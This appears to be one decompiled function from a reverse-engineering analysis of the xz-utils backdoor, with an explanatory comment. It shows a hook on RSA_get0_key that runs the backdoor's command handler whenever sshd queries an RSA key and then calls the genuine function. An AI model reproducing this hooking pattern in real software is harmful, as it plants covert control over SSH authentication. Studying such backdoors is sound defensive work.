// /home/kali/xzre-ghidra/xzregh/10A330_hook_RSA_get0_key.c
// Function: hook_RSA_get0_key @ 0x10A330
// Calling convention: unknown
// Prototype: undefined hook_RSA_get0_key(void)


/*
 * AutoDoc: Lets the backdoor inspect an RSA key whenever sshd queries it by calling `run_backdoor_commands` first, then invoking the genuine RSA_get0_key. The original behaviour is preserved, but the implant captures the key material for later use.
 */
#include "xzre_types.h"


void hook_RSA_get0_key(long param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)

{
  code *UNRECOVERED_JUMPTABLE;
  undefined1 local_1c [4];
  
  if (((global_ctx != 0) && (*(long *)(global_ctx + 8) != 0)) &&
     (UNRECOVERED_JUMPTABLE = *(code **)(*(long *)(global_ctx + 8) + 0x10),
     UNRECOVERED_JUMPTABLE != (code *)0x0)) {
    if (param_1 != 0) {
      run_backdoor_commands(param_1,global_ctx,local_1c);
    }
                    /* WARNING: Could not recover jumptable at 0x0010a394. Too many branches */
                    /* WARNING: Treating indirect jump as call */
    (*UNRECOVERED_JUMPTABLE)(param_1,param_2,param_3,param_4);
    return;
  }
  return;
}

